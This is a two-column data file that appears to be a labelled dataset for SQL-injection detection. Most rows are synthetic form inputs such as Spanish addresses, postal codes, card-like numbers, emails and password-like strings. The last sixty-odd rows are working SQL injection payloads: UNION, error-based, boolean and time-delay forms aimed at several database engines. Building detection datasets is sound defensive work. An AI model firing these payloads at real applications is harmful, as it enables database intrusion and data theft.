Unnamed: 0	payload
9022	calle barrio cura-vigo vello, 134 10?d
9023	ruidera
9024	20268
9025	8970308470180045
9026	birk2
9027	pintipara8a
9028	4183
9029	homan
9030	5on39taci19
9031	bonjorn padura
9032	schonhals-lackteen@opel-e-flex.af
9033	40389675l
9034	passeig nord 23 8b
9035	sigenza
9036	44370
9037	4433404461148186
9038	fulmer
9039	ambas
9040	sheila
9041	mata hita
9042	capers@innovaris.fr
9043	carrer panama, 27 8e
9044	masroig, el
9045	16813
9046	7137970068268248
9047	raqu$9omo
9048	277
9049	+fisgn
9050	nogueira@magritte.ly
9051	46542533d
9052	calle fernando galvan, 192, 7b
9053	2417733801163656
9054	degollar
9055	antulio
9056	morales orpinell
9057	pataki-grifties@hiteurope.by
9058	c/ rua mayor, 31, 1?e
9059	sant vicen de torell
9060	50371
9061	gaile
9062	escamn
9063	arsene
9064	lugartenencia
9065	minardi cardea
9066	78360419v
9067	velilla de san antonio
9068	1359601780395622
9069	shanping
9070	industrializacin
9071	terradas provasi
9072	narita@deportechino.an
9073	50708405y
9074	eliseo pinedo lopez, 195, 11-d
9075	arenas
9076	40197
9077	4456163671536679
9078	atigrada
9079	2797
9080	winfield
9081	inconse_cuente
9082	duchement tenza
9083	espana@flabingo.dk
9084	c/ san salvador, 34, 10?f
9085	fontanarejo
9086	zuzana
9087	asacadora
9088	brbara
9089	longstaff elecciones
9090	kemr@soycatalan.ga
9091	44251271f
9092	calle san sebastian, 154 13d
9093	cobea
9094	40467
9095	7828706714204414
9096	carlin
9097	atolera
9098	2946
9099	descerrajada
9100	kazuo
9101	52535718s
9102	primera 152 11-g
9103	cervantes
9104	2485478366392070
9105	jillayne
9106	blan2ueo
9107	desans totohuetotzint
9108	radunsky_oses@guejosgratis.cg
9109	23456317c
9110	calle las mimosas, 109 5?f
9111	3419068055931419
9112	obermeie
9113	to2adora
9114	5400
9115	othello
9116	3e43a01n8
9117	holoubek@hojainformativas.ua
9118	49649363e
9119	aida 184
9120	03812
9121	7263031959103699
9122	-s9rete
9123	tutusaus tenza
9124	34855320q
9125	urbanitzacio europa-fuentes de san bernabe s/n,
9126	aldeanueva de santa cruz
9127	0512840344034121
9128	autoritariamente
9129	317
9130	larese
9131	callosar
9132	licinio
9133	turro
9134	hays_adiarte@lingotes.com.je
9135	39379430a
9136	calle pintor julian alcaraz, 108, 10-a
9137	fuente el olmo de scar
9138	yount
9139	74s0n2a3
9140	aser
9141	milara kirkpatrick
9142	gault-lovett@lunch.com.ga
9143	20976629p
9144	av. don juan de borbon, s/n
9145	monegrillo
9146	09239
9147	carron
9148	porteril
9149	6485
9150	underwoo
9151	desportilladura
9152	quan@arroyo-molinos.ee
9153	52948186r
9154	el naranjo, s/n 5f
9155	eliana, l'
9156	34112
9157	yuh-tai
9158	hu1garina
9159	camino cementerio, s/n,
9160	romana, la
9161	04897
9162	5825253039721313
9163	nien-hwa
9164	pi9h329a
9165	1320
9166	generato
9167	reto8sivo
9168	prucha@comerciosaspe.ps
9169	plaa doctor robert, 127
9170	lloret de mar
9171	49181
9172	4148689549974834
9173	pettitt
9174	espechar
9175	cister grandi
9176	yong-gomori@andrestabernero.gg
9177	torremacana, 107 7e
9178	24520
9179	2976481678878241
9180	zack
9181	cargu9
9182	1482
9183	esser
9184	amberina
9185	calle pintor juan ismael, 73,
9186	azuqueca de henares
9187	1190044863777145
9188	fater
9189	68m+b11n
9190	pico.malm@4horas.sm
9191	quevedo y quintana s/n, 4-h
9192	5275682756103294
9193	e5f215o6o
9194	9516
9195	kangelis
9196	des7768ab9e6os
9197	rainelda
9198	aun vilaregut
9199	besch@qcole.bt
9200	24645898h
9201	c/ pintor murillo, 23, 8?b
9202	33555
9203	oplinger
9204	3i49uicin
9205	henckels@easyviaggio.tr
9206	38036492n
9207	calle juan de juanes, 143
9208	09311
9209	0908272174397466
9210	s4g51r
9211	cruey
9212	declamatoria
9213	marcolino
9214	salina-sonajew@almeriastella.vg
9215	c/ rio cidacos, 13
9216	1373405933057290
9217	bradney4
9218	t31331
9219	retuerta fong
9220	strucak@cortell.cat
9221	65651817l
9222	poblado de regulares 180, 1d
9223	castro de rei
9224	05659
9225	6974700055894599
9226	tienchie
9227	h4a3pa63
9228	9224
9229	rhonda
9230	br9621.0
9231	corbo gornes
9232	dominguez@comercioenlacalle.hn
9233	31482726g
9234	calle fray luis sotelo, 115 7-b
9235	donhierro
9236	9554640279631297
9237	amalie
9238	arlota
9239	gossett@conac.com.li
9240	42093532j
9241	c/ caceres, 74,
9242	22400
9243	0894971274673122
9244	cybotech
9245	escobado
9246	9717
9247	sathe9
9248	lobanillo
9249	ribot velugo
9250	bonagura.orimoto@portaldesign.ht
9251	48638626c
9252	calle san juan 151 1e
9253	46183
9254	carlie
9255	desplume
9256	robina
9257	venezianti@enigmatico.mu
9258	35715294c
9259	calle virgen de la estrella, 196
9260	plasencia de jaln
9261	37650
9262	drayton
9263	9817
9264	constantemente
9265	testua
9266	longhurst-street1@drae2.pa
9267	37425321c
9268	calle romeral, 143, 7?h
9269	tejeda y segoyuela
9270	8485680523829523
9271	fickes
9272	victorico
9273	novalbos illarraga
9274	gottschlich_candy@piaceredelivery.pk
9275	76156835v
9276	c/ ramos carrion, s/n 2?h
9277	campo de mirra/camp de mirra, el
9278	7774409448573763
9279	kareem
9280	7146
9281	thibaut
9282	almorejo
9283	masmitj
9284	newlinsky@forohh.et
9285	13934213p
9286	xiprer 61, 2-a
9287	7636792275869092
9288	nadir
9289	enardecedora
9290	montvez zurita
9291	nassiet.birkin@cienciapolicial.gl
9292	70075138a
9293	c/ moriles 91
9294	jorquera
9295	25324
9296	5230108987533758
9297	de_leon
9298	599iad12a
9299	kit
9300	artillera
9301	angullo acosta
9302	boring_besch@copiar.com.pg
9303	97963158v
9304	c/ las niadas, 67 9?f
9305	bola, a
9306	49394
9307	reiner
9308	t0na5t44la
9309	lucrecio
9310	jado
9311	de las aguas, 196
9312	37427
9313	7666460029738411
9314	banaei
9315	enga3ladu4a
9316	7159
9317	panosh
9318	m7866
9319	carrique orri
9320	mascarino.marenghi@cocheacoche.lv
9321	51858384p
9322	camio adelfas, 148, 5?g
9323	lladorre
9324	3869324280583649
9325	vilhelmi
9326	volkmann_parfrey1@sigloventidos.be
9327	59718568b
9328	glorieta puerta de hierro, 57
9329	7723056495790878
9330	5046
9331	duffy
9332	acabadamente
9333	vanity@espaciodelpintor.kn
9334	88102583w
9335	albadalejo hijuela 76,
9336	lomoviejo
9337	2777667912628191
9338	maybelle9
9339	5osan$9a
9340	otalora fortiana
9341	avda. general elizaicin 64 5-d
9342	ribamontn al mar
9343	3074429999083032
9344	beal
9345	infalibilidad
9346	marella
9347	5i13r
9348	yoselin
9349	ginard xabe
9350	calle homero, 127
9351	aldeanueva de barbarroya
9352	5132486403637449
9353	dorita
9354	raspar
9355	gou
9356	adoree-halsted1@estoespresto.af
9357	17005940q
9358	zabalbide, 114,
9359	cowper
9360	878eca6or5
9361	8470
9362	jackelyn
9363	gom4sta
9364	rinaldi albiol
9365	rolleck@soybueno.mm
9366	95105299t
9367	calle sant marti, 164
9368	almussafes
9369	nishan5
9370	557ni03r5o
9371	leonel
9372	gabarri
9373	17085407h
9374	c/ fontans, 124, 10?c
9375	06131
9376	9472991515421977
9377	lakshmin
9378	cambulln
9379	6320
9380	senderow
9381	cenheg
9382	rowan_oldman@kpincentives.pn
9383	57186589x
9384	mald
9385	01839
9386	d9str7par
9387	acho queralt
9388	tras castelo 75, 7g
9389	castellar, el
9390	9492211804246641
9391	sa6v682ia
9392	dipterocrea
9393	guilbauth iglsia
9394	altrichter@vilano.cu
9395	joaquin nogueras 51,
9396	biota
9397	3628286866594079
9398	cunanan
9399	rufil
9400	adans zul
9401	tengroth@academiaversal.md
9402	c/ pablo serrano 53 1?g
9403	olmos de ojeda
9404	1862612098499070
9405	reiko
9406	covachuela
9407	1459
9408	abagail
9409	galln
9410	maragliano serna
9411	marquand@eneltajo.bn
9412	45571518p
9413	de gaspar cassado, 134,
9414	norea
9415	44651
9416	hitching
9417	talens zumalacrregui
9418	rode@sayuela.kw
9419	c/ puerto de la magdalena 107
9420	37882
9421	3203257419298834
9422	oretana
9423	5217
9424	monique
9425	jaazael
9426	repraz torrubiano
9427	saint-simon-vondis@paremoselalzheimer.dj
9428	94987112x
9429	calle bruno ayllon, 142, 3?c
9430	uncastillo
9431	8762163912955925
9432	zarpanel
9433	scala@novisa.ch
9434	77293077j
9435	c/ masca 45
9436	hendry
9437	cambuto
9438	3972
9439	flore
9440	pr99o9a9
9441	dalila
9442	ozerea malibrn
9443	hulbert-quillan@habitaciondepanico.pa
9444	rigoberta menchu 184 10?d
9445	1534175885053234
9446	aa
9447	oate fijo
9448	calle gibraltar, 88
9449	44381
9450	7581478216887390
9451	revivificacin
9452	5251
9453	delf
9454	7aria22
9455	sinclair@campanasextractoras.lc
9456	republica eslovaca 104, 1?a
9457	7367769822480051
9458	whiskin
9459	chirlern
9460	pimentel gatius
9461	thomson.kmit9@somagel.sk
9462	12306474w
9463	paraje contador 158, 12d
9464	siete iglesias de trabancos
9465	2039960928892251
9466	marla
9467	delito
9468	6180
9469	doortje
9470	inclemente
9471	auleda sez
9472	walberg@ytv.com.gn
9473	34859412z
9474	calle santander, 0,
9475	lindt38
9476	co875r080ora
9477	labra cheres
9478	sorbello8@carrillo-de-albornoz.jobs
9479	40466
9480	6038552435376719
9481	balcom
9482	aventajada
9483	5202
9484	escobedo
9485	*paci3nte
9486	walter
9487	citti@manjarr.zw
9488	c/ canigo, 196 8?g
9489	cadaqus
9490	jaworsky
9491	aforzarse
9492	adria
9493	carol7@faders.com.bi
9494	85907610b
9495	c/ antonio momplet 114
9496	44338
9497	6969218840353038
9498	duda
9499	ambrosi
9500	aguijon!ear
9501	nelba
9502	ping.kasatsu@asdn.cl
9503	15013152v
9504	obispo diego aponte, s/n
9505	martn del ro
9506	08719
9507	5388028127449105
9508	shubaly
9509	tacita
9510	benejam anglaril
9511	83585437x
9512	passeig de monjo 102, 11?a
9513	villanueva de algaidas
9514	24768
9515	shihhai0
9516	ductilidad
9517	4014
9518	5v1s582a
9519	geldres pittaluga
9520	toroborg@cpanelweb.kp
9521	78370849m
9522	avda. manuel siurot, 12
9523	8728407984769930
9524	e4ca6ce7a5i36
9525	elvian
9526	cendra parga
9527	prada@mundoradiocontrol.zm
9528	18269491q
9529	plaza mayor, s/n 2-g
9530	biosca
9531	4234394543607287
9532	gaiger
9533	melosa
9534	651
9535	justis8
9536	6ilia+ria
9537	aldemar
9538	escribano peraldo
9539	mcavoy-zabczynski@discotecateatre.gt
9540	calle eduard toldra 137 5?a
9541	39419
9542	systems
9543	b6ar1261
9544	maldonado cubillos
9545	mango_rizzo1@premiostv.ky
9546	16966742x
9547	barranc de la torrentera, 56, 13?c
9548	16140
9549	5609281193930681
9550	buscarin
9551	3oque70
9552	4626
9553	asan8
9554	7ar82fa
9555	melgar clavero
9556	calle conjunto avenida, 116
9557	rozaln del monte
9558	2485308810386739
9559	bunn
9560	25g0a00
9561	danning-marrow@etxarriaranatz.nr
9562	c/ doctor coll s/n 8g
9563	valverde de valdelacasa
9564	0385057340947133
9565	jia
9566	2e64n8m5
9567	7766
9568	tomacic
9569	9ein6e0a3
9570	flack@asociaciondearquitectoslatinoamericanos.mobi
9571	02683341t
9572	calle piles, 190
9573	05350
9574	krysta
9575	consumativo
9576	terrs triola
9577	phelpr@eonon.com.pr
9578	catalanes, 137, 3?a
9579	riotorto
9580	35500
9581	6733674859620328
9582	grimble
9583	nardo
9584	9115
9585	eberto
9586	micr6pil8
9587	soffia
9588	c/ alfabia, 147,
9589	3946406903398216
9590	shahab
9591	re6lexin
9592	burbidge@elalamorestaurante.pr
9593	76914964c
9594	plaza fontana, 78,
9595	49622
9596	antanas
9597	soguillo
9598	1063
9599	us
9600	villapando torrontegui
9601	nodonk@locuraporno.ar
9602	56443206x
9603	camino de leganes, 13
9604	almadn de la plata
9605	2784102428679593
9606	logan
9607	rad0oelctrico
9608	calle federico mompou 144 11-d
9609	jabbari
9610	desi4teresal
9611	2813
9612	boony
9613	c2lea
9614	hammond-mcstay@enhierro.com.cn
9615	80537471g
9616	varadero 68, 8-c
9617	4518310510128542
9618	soussa
9619	clarucha
9620	antonell ferriani
9621	forsyne@velaconsultores.mx
9622	00915989z
9623	calle la merce, 120
9624	zarzosa de ro pisuerga
9625	6048168713695182
9626	hy
9627	ap-remiadora
9628	4220
9629	romberg
9630	perene
9631	luisn
9632	felleghy@zafranet.md
9633	martel 153,
9634	el-hawar
9635	musi@inmobiliariahangar.vn
9636	64139121x
9637	c/ adega, 103, 5?g
9638	37522
9639	8512064056348280
9640	c1236ometimi8nto
9641	173
9642	bourget
9643	amaja
9644	barber
9645	ceseri@discotecateatre.do
9646	c/ pereiras 149
9647	13189
9648	7400285622819954
9649	marketa
9650	mantela-do
9651	85130664m
9652	calle catedratico eugenio ubeda romero, s/n,
9653	vlez de benaudalla
9654	slozil
9655	ulc0r81a
9656	4945
9657	schouwen
9658	6rce8o
9659	yeladaky janeiro
9660	munch_velazquez@hiperzaragoza.tk
9661	cami de almoster, 109,
9662	1134273490923216
9663	condensativo
9664	cerda de vigo
9665	sangborivutr@ssextremadura.gr
9666	54011879j
9667	ciencia 123 5b
9668	almedina
9669	6140461790572625
9670	merrywea
9671	saj.ador
9672	2753
9673	han-chie
9674	queral queral
9675	biener@926.bo
9676	c/ maria de padilla 5 12a
9677	quintanalez
9678	47315
9679	oskar
9680	brocatel
9681	ilve
9682	espada stumptner
9683	weddle@teamspanish.bz
9684	78154183e
9685	avenida blasco ibaez, s/n, 6?d
9686	05593
9687	belanger
9688	breosa
9689	8708
9690	suto8i+a
9691	maurino
9692	balzo@onlinegratis.lv
9693	19804746k
9694	antonio ulloa 6 6?d
9695	08759
9696	cecon5
9697	aran1el1ria
9698	mallo etchart
9699	rossi-drago-toores@rubirubi.my
9700	av. bayona 127 1?c
9701	43783
9702	1034309024332493
9703	cobran
9704	t6t2lado
9705	3690
9706	kimberle
9707	a4al4s9
9708	camp fein
9709	fintzi-tevis@cbgerindote.sv
9710	56359685w
9711	c/ les parres, 168
9712	tortuero
9713	37171
9714	5980859147106836
9715	margarit
9716	lenguarada
9717	remo
9718	aizpuru cerusoli
9719	badia del valls
9720	1919202553686950
9721	chuang
9722	visionario
9723	297
9724	samia
9725	s0308ga52r
9726	junco llavallo
9727	rom.val@rpdkorea.eg
9728	97555694k
9729	calle perez galdos, 167
9730	3119845322220598
9731	jole
9732	4907869$l2
9733	13421536r
9734	calle s'arraval, 114
9735	sant celoni
9736	kelcy
9737	ce7a964na
9738	9457
9739	carson
9740	llambric acebron
9741	sterland@zingtonos.vg
9742	15819331t
9743	c/ irmans carro s/n,
9744	goi
9745	46529
9746	6162508820566713
9747	johann
9748	gu9s8na
9749	brgmann saura
9750	39669776c
9751	c/ marcos de torniello, 67 9?d
9752	3789354491351928
9753	newport
9754	requisitorio
9755	6460
9756	alegre nomdedeu
9757	calle estafeta 105 6c
9758	entrala
9759	carras@quiromante.vi
9760	29061025l
9761	calle manzanilla 141,
9762	hontangas
9763	08192
9764	-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#
9765	1'+(select 'gmpn' where 8137=8137 or sleep(5))+'
9766	-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#
9767	"1"" union all select null#"
9768	1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--
9769	1' where 8584=8584 order by 1#
9770	1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
9771	1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--
9772	1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#
9773	"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs"
9774	1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'
9775	"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--"
9776	"1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""="""
9777	1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)
9778	"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw"
9779	1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='
9780	1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge
9781	1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--
9782	"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz"
9783	1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--
9784	"1%"")) order by 1#"
9785	1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--
9786	-6165%')) union all select 5384#
9787	1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
9788	1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
9789	"-2122"") as zytb where 7025=7025 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--"
9790	1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--
9791	1) as imdt where 6431=6431;begin user_lock.sleep(5); end--
9792	1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--
9793	1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (6518=6518
9794	1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--
9795	1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--
9796	"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""="""
9797	-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--
9798	-6108') union all select 2519,2519,2519,2519--
9799	1) where 3979=3979 rlike sleep(5)--
9800	-8143) union all select 3014--
9801	"-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi"
9802	1') where 6624=6624 and 5392=8258
9803	"-3884"" where 8012=8012 union all select 8012,8012#"
9804	"1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""="""
9805	1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--
9806	"1"") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--"
9807	1) where 9371=9371 union all select null,null,null,null,null,null,null--
9808	"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--"
9809	1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
9810	"1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--"
9811	-9336' or 5641=9488#
9812	"-3205"") union all select 5233,5233,5233,5233#"
9813	1') rlike (select * from (select(sleep(5)))vwyq)#
9814	"1"") where 7548=7548;select sleep(5)--"
9815	1';(select * from (select(sleep(5)))srmq)
9816	1'));select case when 2095=9074 then 1 else null end--
9817	"1%"")) rlike (select * from (select(sleep(5)))vwyq)#"
9818	1' where 4134=4134 and 1102=6300--
9819	1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn
9820	"-5800"") or 6872=6872 and (""tcab"" like ""tcab"
9821	"-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--"
9822	(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))
9823	'1
9824	"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--"
9825	1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#
